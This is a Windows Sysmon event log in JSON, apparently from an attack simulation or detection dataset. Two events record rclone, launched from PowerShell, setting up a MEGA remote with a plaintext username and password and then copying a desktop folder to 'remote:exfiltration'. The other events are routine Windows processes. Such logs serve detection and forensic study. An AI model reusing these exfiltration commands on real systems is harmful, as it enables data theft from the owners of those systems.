{
  "System": {
   "Provider": {
    "Name": "Microsoft-Windows-Sysmon",
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
   },
   "EventID": {
    "Value": 1
   },
   "Version": 5,
   "Level": 4,
   "Task": 1,
   "Opcode": 0,
   "Keywords": 9223372036854775808,
   "TimeCreated": {
    "SystemTime": 1677252907.5418031
   },
   "EventRecordID": 76,
   "Correlation": {},
   "Execution": {
    "ProcessID": 4288,
    "ThreadID": 5172
   },
   "Channel": "Microsoft-Windows-Sysmon/Operational",
   "Computer": "DESKTOP-UTDHED2",
   "Security": {
    "UserID": "S-1-5-18"
   }
  },
  "EventData": {
   "RuleName": "-",
   "UtcTime": "2023-02-24 15:35:07.336",
   "ProcessGuid": "10DA3E43-D92B-63F8-B100-000000000900",
   "ProcessId": 3820,
   "Image": "C:\\Users\\wade\\AppData\\Local\\Temp\\rclone-v1.61.1-windows-amd64\\rclone.exe",
   "FileVersion": "1.61.1",
   "Description": "Rsync for cloud storage",
   "Product": "Rclone",
   "Company": "https://rclone.org",
   "OriginalFileName": "rclone.exe",
   "CommandLine": "\"C:\\Users\\wade\\AppData\\Local\\Temp\\rclone-v1.61.1-windows-amd64\\rclone.exe\" config create remote mega user majmeret@protonmail.com pass FBMeavdiaFZbWzpMqIVhJCGXZ5XXZI1qsU3EjhoKQw0rEoQqHyI",
   "CurrentDirectory": "C:\\Users\\wade\\AppData\\Local\\Temp\\rclone-v1.61.1-windows-amd64\\",
   "User": "DESKTOP-UTDHED2\\wade",
   "LogonGuid": "10DA3E43-D892-63F8-4B6D-030000000000",
   "LogonId": 224587,
   "TerminalSessionId": 1,
   "IntegrityLevel": "Medium",
   "Hashes": "SHA256=E94901809FF7CC5168C1E857D4AC9CBB339CA1F6E21DCCE95DFB8E28DF799961",
   "ParentProcessGuid": "10DA3E43-D8D2-63F8-9B00-000000000900",
   "ParentProcessId": 5888,
   "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
   "ParentCommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ",
   "ParentUser": "DESKTOP-UTDHED2\\wade"
  },
  "Message": ""
 }{
  "System": {
   "Provider": {
    "Name": "Microsoft-Windows-Sysmon",
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
   },
   "EventID": {
    "Value": 5
   },
   "Version": 3,
   "Level": 4,
   "Task": 5,
   "Opcode": 0,
   "Keywords": 9223372036854775808,
   "TimeCreated": {
    "SystemTime": 1677252907.82292
   },
   "EventRecordID": 77,
   "Correlation": {},
   "Execution": {
    "ProcessID": 4288,
    "ThreadID": 5172
   },
   "Channel": "Microsoft-Windows-Sysmon/Operational",
   "Computer": "DESKTOP-UTDHED2",
   "Security": {
    "UserID": "S-1-5-18"
   }
  },
  "EventData": {
   "RuleName": "-",
   "UtcTime": "2023-02-24 15:35:07.821",
   "ProcessGuid": "10DA3E43-D92B-63F8-B100-000000000900",
   "ProcessId": 3820,
   "Image": "C:\\Users\\wade\\AppData\\Local\\Temp\\rclone-v1.61.1-windows-amd64\\rclone.exe",
   "User": "DESKTOP-UTDHED2\\wade"
  },
  "Message": ""
 }{
  "System": {
   "Provider": {
    "Name": "Microsoft-Windows-Sysmon",
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
   },
   "EventID": {
    "Value": 1
   },
   "Version": 5,
   "Level": 4,
   "Task": 1,
   "Opcode": 0,
   "Keywords": 9223372036854775808,
   "TimeCreated": {
    "SystemTime": 1677252917.5250704
   },
   "EventRecordID": 78,
   "Correlation": {},
   "Execution": {
    "ProcessID": 4288,
    "ThreadID": 5172
   },
   "Channel": "Microsoft-Windows-Sysmon/Operational",
   "Computer": "DESKTOP-UTDHED2",
   "Security": {
    "UserID": "S-1-5-18"
   }
  },
  "EventData": {
   "RuleName": "-",
   "UtcTime": "2023-02-24 15:35:17.516",
   "ProcessGuid": "10DA3E43-D935-63F8-B200-000000000900",
   "ProcessId": 5116,
   "Image": "C:\\Users\\wade\\AppData\\Local\\Temp\\rclone-v1.61.1-windows-amd64\\rclone.exe",
   "FileVersion": "1.61.1",
   "Description": "Rsync for cloud storage",
   "Product": "Rclone",
   "Company": "https://rclone.org",
   "OriginalFileName": "rclone.exe",
   "CommandLine": "\"C:\\Users\\wade\\AppData\\Local\\Temp\\rclone-v1.61.1-windows-amd64\\rclone.exe\" copy C:\\Users\\Wade\\Desktop\\Relic_location\\ remote:exfiltration -v",
   "CurrentDirectory": "C:\\Users\\wade\\AppData\\Local\\Temp\\rclone-v1.61.1-windows-amd64\\",
   "User": "DESKTOP-UTDHED2\\wade",
   "LogonGuid": "10DA3E43-D892-63F8-4B6D-030000000000",
   "LogonId": 224587,
   "TerminalSessionId": 1,
   "IntegrityLevel": "Medium",
   "Hashes": "SHA256=E94901809FF7CC5168C1E857D4AC9CBB339CA1F6E21DCCE95DFB8E28DF799961",
   "ParentProcessGuid": "10DA3E43-D8D2-63F8-9B00-000000000900",
   "ParentProcessId": 5888,
   "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
   "ParentCommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ",
   "ParentUser": "DESKTOP-UTDHED2\\wade"
  },
  "Message": ""
 }{
  "System": {
   "Provider": {
    "Name": "Microsoft-Windows-Sysmon",
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
   },
   "EventID": {
    "Value": 5
   },
   "Version": 3,
   "Level": 4,
   "Task": 5,
   "Opcode": 0,
   "Keywords": 9223372036854775808,
   "TimeCreated": {
    "SystemTime": 1677252924.0171552
   },
   "EventRecordID": 79,
   "Correlation": {},
   "Execution": {
    "ProcessID": 4288,
    "ThreadID": 5172
   },
   "Channel": "Microsoft-Windows-Sysmon/Operational",
   "Computer": "DESKTOP-UTDHED2",
   "Security": {
    "UserID": "S-1-5-18"
   }
  },
  "EventData": {
   "RuleName": "-",
   "UtcTime": "2023-02-24 15:35:24.013",
   "ProcessGuid": "10DA3E43-D8FE-63F8-A000-000000000900",
   "ProcessId": 3896,
   "Image": "C:\\Windows\\System32\\backgroundTaskHost.exe",
   "User": "DESKTOP-UTDHED2\\wade"
  },
  "Message": ""
 }{
  "System": {
   "Provider": {
    "Name": "Microsoft-Windows-Sysmon",
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
   },
   "EventID": {
    "Value": 5
   },
   "Version": 3,
   "Level": 4,
   "Task": 5,
   "Opcode": 0,
   "Keywords": 9223372036854775808,
   "TimeCreated": {
    "SystemTime": 1677252925.3610833
   },
   "EventRecordID": 80,
   "Correlation": {},
   "Execution": {
    "ProcessID": 4288,
    "ThreadID": 5172
   },
   "Channel": "Microsoft-Windows-Sysmon/Operational",
   "Computer": "DESKTOP-UTDHED2",
   "Security": {
    "UserID": "S-1-5-18"
   }
  },
  "EventData": {
   "RuleName": "-",
   "UtcTime": "2023-02-24 15:35:25.343",
   "ProcessGuid": "10DA3E43-D935-63F8-B200-000000000900",
   "ProcessId": 5116,
   "Image": "C:\\Users\\wade\\AppData\\Local\\Temp\\rclone-v1.61.1-windows-amd64\\rclone.exe",
   "User": "DESKTOP-UTDHED2\\wade"
  },
  "Message": ""
 }{
  "System": {
   "Provider": {
    "Name": "Microsoft-Windows-Sysmon",
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
   },
   "EventID": {
    "Value": 1
   },
   "Version": 5,
   "Level": 4,
   "Task": 1,
   "Opcode": 0,
   "Keywords": 9223372036854775808,
   "TimeCreated": {
    "SystemTime": 1677252926.1164336
   },
   "EventRecordID": 81,
   "Correlation": {},
   "Execution": {
    "ProcessID": 4288,
    "ThreadID": 5172
   },
   "Channel": "Microsoft-Windows-Sysmon/Operational",
   "Computer": "DESKTOP-UTDHED2",
   "Security": {
    "UserID": "S-1-5-18"
   }
  },
  "EventData": {
   "RuleName": "-",
   "UtcTime": "2023-02-24 15:35:26.111",
   "ProcessGuid": "10DA3E43-D93E-63F8-B300-000000000900",
   "ProcessId": 4504,
   "Image": "C:\\Windows\\System32\\taskhostw.exe",
   "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
   "Description": "Host Process for Windows Tasks",
   "Product": "Microsoft® Windows® Operating System",
   "Company": "Microsoft Corporation",
   "OriginalFileName": "taskhostw.exe",
   "CommandLine": "taskhostw.exe",
   "CurrentDirectory": "C:\\Windows\\system32\\",
   "User": "NT AUTHORITY\\SYSTEM",
   "LogonGuid": "10DA3E43-6524-63F9-E703-000000000000",
   "LogonId": 999,
   "TerminalSessionId": 0,
   "IntegrityLevel": "System",
   "Hashes": "SHA256=72279AD47EED7FBF2472214824696351B9CB2571B8EE5D8C92FADA23B378D812",
   "ParentProcessGuid": "00000000-0000-0000-0000-000000000000",
   "ParentProcessId": 1008,
   "ParentImage": "-",
   "ParentCommandLine": "-",
   "ParentUser": "-"
  },
  "Message": ""
 }{
  "System": {
   "Provider": {
    "Name": "Microsoft-Windows-Sysmon",
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
   },
   "EventID": {
    "Value": 5
   },
   "Version": 3,
   "Level": 4,
   "Task": 5,
   "Opcode": 0,
   "Keywords": 9223372036854775808,
   "TimeCreated": {
    "SystemTime": 1677252926.2699263
   },
   "EventRecordID": 82,
   "Correlation": {},
   "Execution": {
    "ProcessID": 4288,
    "ThreadID": 5172
   },
   "Channel": "Microsoft-Windows-Sysmon/Operational",
   "Computer": "DESKTOP-UTDHED2",
   "Security": {
    "UserID": "S-1-5-18"
   }
  },
  "EventData": {
   "RuleName": "-",
   "UtcTime": "2023-02-24 15:35:26.250",
   "ProcessGuid": "10DA3E43-D93E-63F8-B300-000000000900",
   "ProcessId": 4504,
   "Image": "C:\\Windows\\System32\\taskhostw.exe",
   "User": "NT AUTHORITY\\SYSTEM"
  },
  "Message": ""
 }{
  "System": {
   "Provider": {
    "Name": "Microsoft-Windows-Sysmon",
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
   },
   "EventID": {
    "Value": 5
   },
   "Version": 3,
   "Level": 4,
   "Task": 5,
   "Opcode": 0,
   "Keywords": 9223372036854775808,
   "TimeCreated": {
    "SystemTime": 1677252928.9197168
   },
   "EventRecordID": 83,
   "Correlation": {},
   "Execution": {
    "ProcessID": 4288,
    "ThreadID": 5172
   },
   "Channel": "Microsoft-Windows-Sysmon/Operational",
   "Computer": "DESKTOP-UTDHED2",
   "Security": {
    "UserID": "S-1-5-18"
   }
  },
  "EventData": {
   "RuleName": "-",
   "UtcTime": "2023-02-24 15:35:28.913",
   "ProcessGuid": "10DA3E43-D8CE-63F8-9700-000000000900",
   "ProcessId": 5732,
   "Image": "C:\\Program Files\\Wireshark\\dumpcap.exe",
   "User": "DESKTOP-UTDHED2\\wade"
  },
  "Message": ""
 }{
  "System": {
   "Provider": {
    "Name": "Microsoft-Windows-Sysmon",
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
   },
   "EventID": {
    "Value": 5
   },
   "Version": 3,
   "Level": 4,
   "Task": 5,
   "Opcode": 0,
   "Keywords": 9223372036854775808,
   "TimeCreated": {
    "SystemTime": 1677252928.9356785
   },
   "EventRecordID": 84,
   "Correlation": {},
   "Execution": {
    "ProcessID": 4288,
    "ThreadID": 5172
   },
   "Channel": "Microsoft-Windows-Sysmon/Operational",
   "Computer": "DESKTOP-UTDHED2",
   "Security": {
    "UserID": "S-1-5-18"
   }
  },
  "EventData": {
   "RuleName": "-",
   "UtcTime": "2023-02-24 15:35:28.929",
   "ProcessGuid": "10DA3E43-D8CE-63F8-9800-000000000900",
   "ProcessId": 5740,
   "Image": "C:\\Windows\\System32\\conhost.exe",
   "User": "DESKTOP-UTDHED2\\wade"
  },
  "Message": ""
 }{
  "System": {
   "Provider": {
    "Name": "Microsoft-Windows-Sysmon",
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
   },
   "EventID": {
    "Value": 1
   },
   "Version": 5,
   "Level": 4,
   "Task": 1,
   "Opcode": 0,
   "Keywords": 9223372036854775808,
   "TimeCreated": {
    "SystemTime": 1677252938.2603295
   },
   "EventRecordID": 85,
   "Correlation": {},
   "Execution": {
    "ProcessID": 4288,
    "ThreadID": 5172
   },
   "Channel": "Microsoft-Windows-Sysmon/Operational",
   "Computer": "DESKTOP-UTDHED2",
   "Security": {
    "UserID": "S-1-5-18"
   }
  },
  "EventData": {
   "RuleName": "-",
   "UtcTime": "2023-02-24 15:35:38.248",
   "ProcessGuid": "10DA3E43-D94A-63F8-B400-000000000900",
   "ProcessId": 5264,
   "Image": "C:\\Windows\\System32\\dllhost.exe",
   "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
   "Description": "COM Surrogate",
   "Product": "Microsoft® Windows® Operating System",
   "Company": "Microsoft Corporation",
   "OriginalFileName": "dllhost.exe",
   "CommandLine": "C:\\Windows\\system32\\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}",
   "CurrentDirectory": "C:\\Windows\\system32\\",
   "User": "DESKTOP-UTDHED2\\wade",
   "LogonGuid": "10DA3E43-D892-63F8-4B6D-030000000000",
   "LogonId": 224587,
   "TerminalSessionId": 1,
   "IntegrityLevel": "Medium",
   "Hashes": "SHA256=E7FC40B41AA8B83841A0B96D169EAF0800AA784733E636935374D56536253F10",
   "ParentProcessGuid": "00000000-0000-0000-0000-000000000000",
   "ParentProcessId": 736,
   "ParentImage": "-",
   "ParentCommandLine": "-",
   "ParentUser": "-"
  },
  "Message": ""
 }{
  "System": {
   "Provider": {
    "Name": "Microsoft-Windows-Sysmon",
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
   },
   "EventID": {
    "Value": 5
   },
   "Version": 3,
   "Level": 4,
   "Task": 5,
   "Opcode": 0,
   "Keywords": 9223372036854775808,
   "TimeCreated": {
    "SystemTime": 1677252943.3213809
   },
   "EventRecordID": 86,
   "Correlation": {},
   "Execution": {
    "ProcessID": 4288,
    "ThreadID": 5172
   },
   "Channel": "Microsoft-Windows-Sysmon/Operational",
   "Computer": "DESKTOP-UTDHED2",
   "Security": {
    "UserID": "S-1-5-18"
   }
  },
  "EventData": {
   "RuleName": "-",
   "UtcTime": "2023-02-24 15:35:43.318",
   "ProcessGuid": "10DA3E43-D94A-63F8-B400-000000000900",
   "ProcessId": 5264,
   "Image": "C:\\Windows\\System32\\dllhost.exe",
   "User": "DESKTOP-UTDHED2\\wade"
  },
  "Message": ""
 }{
  "System": {
   "Provider": {
    "Name": "Microsoft-Windows-Sysmon",
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
   },
   "EventID": {
    "Value": 1
   },
   "Version": 5,
   "Level": 4,
   "Task": 1,
   "Opcode": 0,
   "Keywords": 9223372036854775808,
   "TimeCreated": {
    "SystemTime": 1677252943.579344
   },
   "EventRecordID": 87,
   "Correlation": {},
   "Execution": {
    "ProcessID": 4288,
    "ThreadID": 5172
   },
   "Channel": "Microsoft-Windows-Sysmon/Operational",
   "Computer": "DESKTOP-UTDHED2",
   "Security": {
    "UserID": "S-1-5-18"
   }
  },
  "EventData": {
   "RuleName": "-",
   "UtcTime": "2023-02-24 15:35:43.542",
   "ProcessGuid": "10DA3E43-D94F-63F8-B500-000000000900",
   "ProcessId": 5404,
   "Image": "C:\\Windows\\System32\\dllhost.exe",
   "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
   "Description": "COM Surrogate",
   "Product": "Microsoft® Windows® Operating System",
   "Company": "Microsoft Corporation",
   "OriginalFileName": "dllhost.exe",
   "CommandLine": "C:\\Windows\\system32\\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}",
   "CurrentDirectory": "C:\\Windows\\system32\\",
   "User": "DESKTOP-UTDHED2\\wade",
   "LogonGuid": "10DA3E43-D892-63F8-4B6D-030000000000",
   "LogonId": 224587,
   "TerminalSessionId": 1,
   "IntegrityLevel": "Medium",
   "Hashes": "SHA256=E7FC40B41AA8B83841A0B96D169EAF0800AA784733E636935374D56536253F10",
   "ParentProcessGuid": "00000000-0000-0000-0000-000000000000",
   "ParentProcessId": 736,
   "ParentImage": "-",
   "ParentCommandLine": "-",
   "ParentUser": "-"
  },
  "Message": ""
 }{
  "System": {
   "Provider": {
    "Name": "Microsoft-Windows-Sysmon",
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
   },
   "EventID": {
    "Value": 5
   },
   "Version": 3,
   "Level": 4,
   "Task": 5,
   "Opcode": 0,
   "Keywords": 9223372036854775808,
   "TimeCreated": {
    "SystemTime": 1677252948.633365
   },
   "EventRecordID": 88,
   "Correlation": {},
   "Execution": {
    "ProcessID": 4288,
    "ThreadID": 5172
   },
   "Channel": "Microsoft-Windows-Sysmon/Operational",
   "Computer": "DESKTOP-UTDHED2",
   "Security": {
    "UserID": "S-1-5-18"
   }
  },
  "EventData": {
   "RuleName": "-",
   "UtcTime": "2023-02-24 15:35:48.630",
   "ProcessGuid": "10DA3E43-D94F-63F8-B500-000000000900",
   "ProcessId": 5404,
   "Image": "C:\\Windows\\System32\\dllhost.exe",
   "User": "DESKTOP-UTDHED2\\wade"
  },
  "Message": ""
 }{
  "System": {
   "Provider": {
    "Name": "Microsoft-Windows-Sysmon",
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
   },
   "EventID": {
    "Value": 1
   },
   "Version": 5,
   "Level": 4,
   "Task": 1,
   "Opcode": 0,
   "Keywords": 9223372036854775808,
   "TimeCreated": {
    "SystemTime": 1677252952.8326209
   },
   "EventRecordID": 89,
   "Correlation": {},
   "Execution": {
    "ProcessID": 4288,
    "ThreadID": 5172
   },
   "Channel": "Microsoft-Windows-Sysmon/Operational",
   "Computer": "DESKTOP-UTDHED2",
   "Security": {
    "UserID": "S-1-5-18"
   }
  },
  "EventData": {
   "RuleName": "-",
   "UtcTime": "2023-02-24 15:35:52.291",
   "ProcessGuid": "10DA3E43-D958-63F8-B600-000000000900",
   "ProcessId": 5516,
   "Image": "C:\\Windows\\System32\\dllhost.exe",
   "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
   "Description": "COM Surrogate",
   "Product": "Microsoft® Windows® Operating System",
   "Company": "Microsoft Corporation",
   "OriginalFileName": "dllhost.exe",
   "CommandLine": "C:\\Windows\\system32\\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}",
   "CurrentDirectory": "C:\\Windows\\system32\\",
   "User": "DESKTOP-UTDHED2\\wade",
   "LogonGuid": "10DA3E43-D892-63F8-4B6D-030000000000",
   "LogonId": 224587,
   "TerminalSessionId": 1,
   "IntegrityLevel": "Medium",
   "Hashes": "SHA256=E7FC40B41AA8B83841A0B96D169EAF0800AA784733E636935374D56536253F10",
   "ParentProcessGuid": "00000000-0000-0000-0000-000000000000",
   "ParentProcessId": 736,
   "ParentImage": "-",
   "ParentCommandLine": "-",
   "ParentUser": "-"
  },
  "Message": ""
 }{
  "System": {
   "Provider": {
    "Name": "Microsoft-Windows-Sysmon",
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
   },
   "EventID": {
    "Value": 1
   },
   "Version": 5,
   "Level": 4,
   "Task": 1,
   "Opcode": 0,
   "Keywords": 9223372036854775808,
   "TimeCreated": {
    "SystemTime": 1677252953.68292
   },
   "EventRecordID": 90,
   "Correlation": {},
   "Execution": {
    "ProcessID": 4288,
    "ThreadID": 5172
   },
   "Channel": "Microsoft-Windows-Sysmon/Operational",
   "Computer": "DESKTOP-UTDHED2",
   "Security": {
    "UserID": "S-1-5-18"
   }
  },
  "EventData": {
   "RuleName": "-",
   "UtcTime": "2023-02-24 15:35:52.536",
   "ProcessGuid": "10DA3E43-D958-63F8-B700-000000000900",
   "ProcessId": 5444,
   "Image": "C:\\Windows\\System32\\SearchProtocolHost.exe",
   "FileVersion": "7.0.19041.610 (WinBuild.160101.0800)",
   "Description": "Microsoft Windows Search Protocol Host",
   "Product": "Windows® Search",
   "Company": "Microsoft Corporation",
   "OriginalFileName": "SearchProtocolHost.exe",
   "CommandLine": "\"C:\\Windows\\system32\\SearchProtocolHost.exe\" Global\\UsGthrFltPipeMssGthrPipe2_ Global\\UsGthrCtrlFltPipeMssGthrPipe2 1 -2147483646 \"Software\\Microsoft\\Windows Search\" \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)\" \"C:\\ProgramData\\Microsoft\\Search\\Data\\Temp\\usgthrsvc\" \"DownLevelDaemon\" ",
   "CurrentDirectory": "C:\\Windows\\system32\\",
   "User": "NT AUTHORITY\\SYSTEM",
   "LogonGuid": "10DA3E43-6524-63F9-E703-000000000000",
   "LogonId": 999,
   "TerminalSessionId": 0,
   "IntegrityLevel": "System",
   "Hashes": "SHA256=59CC005C70A7E16BD2E0C8DF3DAF7E6F9FCA5B49A7A377A62775480579A5252F",
   "ParentProcessGuid": "10DA3E43-D896-63F8-5900-000000000900",
   "ParentProcessId": 3024,
   "ParentImage": "C:\\Windows\\System32\\SearchIndexer.exe",
   "ParentCommandLine": "C:\\Windows\\system32\\SearchIndexer.exe /Embedding",
   "ParentUser": "NT AUTHORITY\\SYSTEM"
  },
  "Message": ""
 }{
  "System": {
   "Provider": {
    "Name": "Microsoft-Windows-Sysmon",
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
   },
   "EventID": {
    "Value": 1
   },
   "Version": 5,
   "Level": 4,
   "Task": 1,
   "Opcode": 0,
   "Keywords": 9223372036854775808,
   "TimeCreated": {
    "SystemTime": 1677252953.7267168
   },
   "EventRecordID": 91,
   "Correlation": {},
   "Execution": {
    "ProcessID": 4288,
    "ThreadID": 5172
   },
   "Channel": "Microsoft-Windows-Sysmon/Operational",
   "Computer": "DESKTOP-UTDHED2",
   "Security": {
    "UserID": "S-1-5-18"
   }
  },
  "EventData": {
   "RuleName": "-",
   "UtcTime": "2023-02-24 15:35:53.716",
   "ProcessGuid": "10DA3E43-D959-63F8-B800-000000000900",
   "ProcessId": 2212,
   "Image": "C:\\Windows\\System32\\SearchFilterHost.exe",
   "FileVersion": "7.0.19041.610 (WinBuild.160101.0800)",
   "Description": "Microsoft Windows Search Filter Host",
   "Product": "Windows® Search",
   "Company": "Microsoft Corporation",
   "OriginalFileName": "SearchFilterHost.exe",
   "CommandLine": "\"C:\\Windows\\system32\\SearchFilterHost.exe\" 0 792 796 804 8192 800 776 ",
   "CurrentDirectory": "C:\\Windows\\system32\\",
   "User": "NT AUTHORITY\\SYSTEM",
   "LogonGuid": "10DA3E43-6524-63F9-E703-000000000000",
   "LogonId": 999,
   "TerminalSessionId": 0,
   "IntegrityLevel": "Medium",
   "Hashes": "SHA256=FFBCF5F709E1E017EAC64AF5C9E232140FCA2D1A02A64C1FFFD965B1E5AB842F",
   "ParentProcessGuid": "10DA3E43-D896-63F8-5900-000000000900",
   "ParentProcessId": 3024,
   "ParentImage": "C:\\Windows\\System32\\SearchIndexer.exe",
   "ParentCommandLine": "C:\\Windows\\system32\\SearchIndexer.exe /Embedding",
   "ParentUser": "NT AUTHORITY\\SYSTEM"
  },
  "Message": ""
 }{
  "System": {
   "Provider": {
    "Name": "Microsoft-Windows-Sysmon",
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
   },
   "EventID": {
    "Value": 5
   },
   "Version": 3,
   "Level": 4,
   "Task": 5,
   "Opcode": 0,
   "Keywords": 9223372036854775808,
   "TimeCreated": {
    "SystemTime": 1677252957.30764
   },
   "EventRecordID": 92,
   "Correlation": {},
   "Execution": {
    "ProcessID": 4288,
    "ThreadID": 5172
   },
   "Channel": "Microsoft-Windows-Sysmon/Operational",
   "Computer": "DESKTOP-UTDHED2",
   "Security": {
    "UserID": "S-1-5-18"
   }
  },
  "EventData": {
   "RuleName": "-",
   "UtcTime": "2023-02-24 15:35:57.238",
   "ProcessGuid": "10DA3E43-D8C3-63F8-8C00-000000000900",
   "ProcessId": 5356,
   "Image": "C:\\Program Files\\Wireshark\\Wireshark.exe",
   "User": "DESKTOP-UTDHED2\\wade"
  },
  "Message": ""
 }{
  "System": {
   "Provider": {
    "Name": "Microsoft-Windows-Sysmon",
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
   },
   "EventID": {
    "Value": 5
   },
   "Version": 3,
   "Level": 4,
   "Task": 5,
   "Opcode": 0,
   "Keywords": 9223372036854775808,
   "TimeCreated": {
    "SystemTime": 1677252958.6241152
   },
   "EventRecordID": 93,
   "Correlation": {},
   "Execution": {
    "ProcessID": 4288,
    "ThreadID": 5172
   },
   "Channel": "Microsoft-Windows-Sysmon/Operational",
   "Computer": "DESKTOP-UTDHED2",
   "Security": {
    "UserID": "S-1-5-18"
   }
  },
  "EventData": {
   "RuleName": "-",
   "UtcTime": "2023-02-24 15:35:58.621",
   "ProcessGuid": "10DA3E43-D958-63F8-B600-000000000900",
   "ProcessId": 5516,
   "Image": "C:\\Windows\\System32\\dllhost.exe",
   "User": "DESKTOP-UTDHED2\\wade"
  },
  "Message": ""
 }{
  "System": {
   "Provider": {
    "Name": "Microsoft-Windows-Sysmon",
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
   },
   "EventID": {
    "Value": 5
   },
   "Version": 3,
   "Level": 4,
   "Task": 5,
   "Opcode": 0,
   "Keywords": 9223372036854775808,
   "TimeCreated": {
    "SystemTime": 1677252960.940555
   },
   "EventRecordID": 94,
   "Correlation": {},
   "Execution": {
    "ProcessID": 4288,
    "ThreadID": 5172
   },
   "Channel": "Microsoft-Windows-Sysmon/Operational",
   "Computer": "DESKTOP-UTDHED2",
   "Security": {
    "UserID": "S-1-5-18"
   }
  },
  "EventData": {
   "RuleName": "-",
   "UtcTime": "2023-02-24 15:36:00.849",
   "ProcessGuid": "10DA3E43-D902-63F8-A600-000000000900",
   "ProcessId": 5288,
   "Image": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
   "User": "NT AUTHORITY\\NETWORK SERVICE"
  },
  "Message": ""
 }{
  "System": {
   "Provider": {
    "Name": "Microsoft-Windows-Sysmon",
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
   },
   "EventID": {
    "Value": 1
   },
   "Version": 5,
   "Level": 4,
   "Task": 1,
   "Opcode": 0,
   "Keywords": 9223372036854775808,
   "TimeCreated": {
    "SystemTime": 1677252961.78928
   },
   "EventRecordID": 95,
   "Correlation": {},
   "Execution": {
    "ProcessID": 4288,
    "ThreadID": 5172
   },
   "Channel": "Microsoft-Windows-Sysmon/Operational",
   "Computer": "DESKTOP-UTDHED2",
   "Security": {
    "UserID": "S-1-5-18"
   }
  },
  "EventData": {
   "RuleName": "-",
   "UtcTime": "2023-02-24 15:36:01.721",
   "ProcessGuid": "10DA3E43-D961-63F8-B900-000000000900",
   "ProcessId": 2804,
   "Image": "C:\\Windows\\System32\\dllhost.exe",
   "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
   "Description": "COM Surrogate",
   "Product": "Microsoft® Windows® Operating System",
   "Company": "Microsoft Corporation",
   "OriginalFileName": "dllhost.exe",
   "CommandLine": "C:\\Windows\\system32\\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}",
   "CurrentDirectory": "C:\\Windows\\system32\\",
   "User": "DESKTOP-UTDHED2\\wade",
   "LogonGuid": "10DA3E43-D892-63F8-4B6D-030000000000",
   "LogonId": 224587,
   "TerminalSessionId": 1,
   "IntegrityLevel": "Medium",
   "Hashes": "SHA256=E7FC40B41AA8B83841A0B96D169EAF0800AA784733E636935374D56536253F10",
   "ParentProcessGuid": "00000000-0000-0000-0000-000000000000",
   "ParentProcessId": 736,
   "ParentImage": "-",
   "ParentCommandLine": "-",
   "ParentUser": "-"
  },
  "Message": ""
 }{
  "System": {
   "Provider": {
    "Name": "Microsoft-Windows-Sysmon",
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
   },
   "EventID": {
    "Value": 5
   },
   "Version": 3,
   "Level": 4,
   "Task": 5,
   "Opcode": 0,
   "Keywords": 9223372036854775808,
   "TimeCreated": {
    "SystemTime": 1677252967.1110032
   },
   "EventRecordID": 96,
   "Correlation": {},
   "Execution": {
    "ProcessID": 4288,
    "ThreadID": 5172
   },
   "Channel": "Microsoft-Windows-Sysmon/Operational",
   "Computer": "DESKTOP-UTDHED2",
   "Security": {
    "UserID": "S-1-5-18"
   }
  },
  "EventData": {
   "RuleName": "-",
   "UtcTime": "2023-02-24 15:36:07.105",
   "ProcessGuid": "10DA3E43-D961-63F8-B900-000000000900",
   "ProcessId": 2804,
   "Image": "C:\\Windows\\System32\\dllhost.exe",
   "User": "DESKTOP-UTDHED2\\wade"
  },
  "Message": ""
 }